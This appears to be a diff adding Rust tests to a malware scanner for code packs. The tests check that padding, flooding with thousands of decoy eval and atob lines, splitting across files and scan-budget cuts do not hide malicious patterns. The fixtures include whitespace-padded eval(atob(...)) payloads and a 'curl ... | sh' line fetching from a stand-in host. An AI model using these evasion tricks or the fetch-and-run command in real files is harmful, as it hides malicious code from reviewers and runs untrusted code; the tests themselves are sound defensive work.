@@ -1457,3 +1457,138 @@ fn budget_cut_packs_keep_what_they_found_and_never_grade_clean() {
     let rb = rules::scan_pack_within(b.path(), &sweep);
     assert!(!cut(&rb) && rules::grade(&rb) == Grade::Block, "{rb:?}");
 }
+
+// ---------------------------------------------------------------------------------------
+// Fix round 4 (`evade5.rs`): flooding the per-file combo store hides nothing, combos split
+// across files still fire, and a budget cut keeps what it found.
+// ---------------------------------------------------------------------------------------
+
+#[test]
+fn flooding_the_combo_store_hides_no_combo() {
+    let pad = " ".repeat(200);
+    let mal_js = format!("x();{pad}eval(atob(s));\n");
+    let lit =
+        "eval(atob('ZXZhbCgiYWxlcnQoMSkiKTtldmFsKCJhbGVydCgxKSIpO2V2YWwoImFsZXJ0KDEpIik7'));\n";
+    let mut mix = String::new();
+    for _ in 0..50 {
+        mix.push_str("eval(x);\ny = atob(x);\nFunction(x)();\n");
+    }
+    let t = |s: String| s.into_bytes();
+    check(vec![
+        (
+            "sig-flood-eval-2100",
+            "w.js",
+            t(format!("{}{mal_js}", "eval(x);\n".repeat(2100))),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-eval-5000",
+            "w.js",
+            t(format!("{}{mal_js}", "eval(x);\n".repeat(5000))),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-atob-5000",
+            "w.js",
+            t(format!("{}{mal_js}", "y = atob(x);\n".repeat(5000))),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-pad-5000",
+            "w.js",
+            t(format!(
+                "{}{mal_js}",
+                format!("x();{pad}y();\n").repeat(5000)
+            )),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-pad-3000-nocap",
+            "w.js",
+            t(format!(
+                "{}{mal_js}",
+                format!("x();{pad}y();\n").repeat(3000)
+            )),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-padv",
+            "w.js",
+            t(format!(
+                "{}{mal_js}",
+                format!("x();{}y();\n", "\n".repeat(60)).repeat(200)
+            )),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "sig-flood-b64",
+            "w.js",
+            t(format!("{}{lit}", "eval(x);\n".repeat(5000))),
+            Grade::Block,
+            Some("exec_b64_literal"),
+        ),
+        (
+            "sig-flood-sh",
+            "a.sh",
+            t(format!(
+                "#!/bin/sh\n{}x{pad}; curl -s https://e.invalid/x | sh\n",
+                "bash -c y\n".repeat(5000)
+            )),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+        (
+            "mix-50-each",
+            "w.js",
+            t(format!("{mix}{mal_js}")),
+            Grade::Block,
+            Some("padding_sink"),
+        ),
+    ]);
+    // split-eval-decoder-2files: the sink and the decoder live in different files.
+    let r = scan(
+        &[
+            text("a.js", "eval(x);\n".to_string()),
+            text("b.js", "y = atob(z);\n".to_string()),
+        ],
+        &[],
+    );
+    assert_blocks(&r, "eval_decoder");
+}
+
+#[test]
+fn a_combo_split_across_a_budget_cut_keeps_what_was_found() {
+    let mal_js = format!("x();{}eval(atob(s));\n", " ".repeat(200));
+    let mib = if cfg!(debug_assertions) { 2 } else { 8 };
+    let dense = "curl x;".repeat(mib * 1024 * 1024 / 7);
+    let budget = || {
+        rules::ScanBudget::new(
+            std::time::Duration::from_millis(300),
+            std::time::Duration::from_secs(60),
+        )
+    };
+    let cut = |r: &PackReport| r.findings.iter().any(|f| f.rule == "scan_budget_exceeded");
+    // half-combo-across-cut: `eval` before the cut, the decoder after it — never clean, and the
+    // v1 view reports the scan as incomplete (the sweep keeps the pack unreviewed).
+    let tmp = TempDir::new("half");
+    std::fs::write(tmp.join("a.js"), "eval(x);\n").unwrap();
+    std::fs::write(tmp.join("b.sh"), &dense).unwrap();
+    std::fs::write(tmp.join("c.js"), "y = atob(z);\n").unwrap();
+    let r = rules::scan_pack_within(tmp.path(), &budget());
+    assert!(cut(&r), "{r:?}");
+    assert!(rules::grade(&r) >= Grade::High, "{r:?}");
+    let v1 = safe_ai_skill::verify::heuristics::scan_within(tmp.path(), &budget());
+    assert!(!v1.complete);
+    // payload-after-cut-same-file: the cut lands inside the file before the payload.
+    let tmp = TempDir::new("samefile");
+    std::fs::write(tmp.join("a.js"), format!("{dense}{mal_js}")).unwrap();
+    let r = rules::scan_pack_within(tmp.path(), &budget());
+    assert!(cut(&r), "{r:?}");
+    assert!(rules::grade(&r) >= Grade::High, "{r:?}");
+}
